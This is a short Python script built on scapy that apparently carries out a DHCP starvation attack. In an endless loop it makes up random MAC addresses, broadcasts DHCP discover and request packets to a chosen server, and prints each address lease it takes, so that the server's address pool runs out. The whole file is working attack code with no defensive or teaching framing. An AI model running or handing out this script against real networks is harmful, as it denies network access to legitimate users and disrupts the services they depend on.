import sys, random
from scapy.all import *

server = sys.argv[1]

def dora():
    mac = str(RandMAC())
    xid = random.randint(1, 2**32-1)
    chaddr = bytes.fromhex(mac.replace(":",""))

    sendp(Ether(src=mac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=chaddr,xid=xid)/DHCP(options=[("message-type","discover"),"end"]), iface="eth0", verbose=0)

    offer = sniff(iface="eth0", filter="udp port 68", count=1, timeout=2)
    if not offer or DHCP not in offer[0]: return

    ip = offer[0][BOOTP].yiaddr
    sendp(Ether(src=mac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=chaddr,xid=xid)/DHCP(options=[("message-type","request"),("server_id",server),("requested_addr",ip),"end"]), iface="eth0", verbose=0)
    print(f"[+] {mac} -> {ip}")

while True:
    dora()
